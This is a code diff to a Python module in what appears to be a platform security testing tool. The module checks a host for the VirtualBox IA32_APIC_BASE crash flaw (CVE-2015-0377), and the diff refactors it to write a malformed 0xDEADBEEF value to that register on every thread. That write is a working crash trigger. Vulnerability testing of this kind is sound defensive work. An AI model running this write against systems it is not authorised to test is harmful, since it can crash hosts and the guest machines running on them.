@@ -50,20 +50,22 @@ _MODULE_NAME = 'vbox_crash_apicbase'
 class vbox_crash_apicbase(BaseModule):
     def __init__(self):
         BaseModule.__init__(self)
+        self.cs.set_scope({
+            None: "*.MSR",
+        })
 
     def run(self, module_argv):
         self.logger.start_test('Host OS Crash due to IA32_APIC_BASE (Oracle VirtualBox CVE-2015-0377)')
-
-        tid = 0
-        apicbase_msr = self.cs.register.read('IA32_APIC_BASE', tid)
-        self.cs.register.print('IA32_APIC_BASE', apicbase_msr)
-        apicbase_msr = 0xDEADBEEF00000000 | (apicbase_msr & 0xFFFFFFFF)
-        self.logger.log(f'[*] Writing 0x{apicbase_msr:016X} to IA32_APIC_BASE MSR..')
-        try:
-            self.cs.register.write('IA32_APIC_BASE', apicbase_msr, tid)
-        except HWAccessViolationError:
-            self.logger.log('System blocked write attempt.')
-
+        apicbase_msr_list = self.cs.control.get_list_by_name('IA32_APIC_BASE')
+        apicbase_msr_list.read_and_print()
+        for apicbase_msr in apicbase_msr_list:
+            apicbase_msr.set_value(0xDEADBEEF00000000 | (apicbase_msr.value & 0xFFFFFFFF))
+            self.logger.log(f'[*] Writing 0x{apicbase_msr:016X} to IA32_APIC_BASE MSR..')
+            try:
+                apicbase_msr.write(apicbase_msr.value)
+            except HWAccessViolationError:
+                self.logger.log('System blocked write attempt.')
+            
         # If we are here, then we are fine ;)
         self.logger.log_passed("VMM/Host OS didn't crash (not vulnerable)")
         self.result.setStatusBit(self.result.status.SUCCESS)
